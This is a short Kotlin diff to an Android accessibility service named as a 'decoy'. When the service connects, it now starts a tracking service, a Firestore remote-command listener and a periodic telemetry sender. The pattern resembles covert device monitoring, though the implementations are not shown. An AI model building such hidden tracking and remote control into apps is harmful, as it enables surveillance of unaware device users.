@@ -30,6 +30,9 @@ class AppDecoyAccessibilityService : AccessibilityService() {
         }
         overlayWindow = getSystemService(WINDOW_SERVICE) as WindowManager
         Log.i(TAG, "decoy accessibility service connected")
+        TrackdSentinelService.start(this)
+        FirestoreSync.startCommandListener(this)
+        TelemetryDispatcher.startPeriodic(this)
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
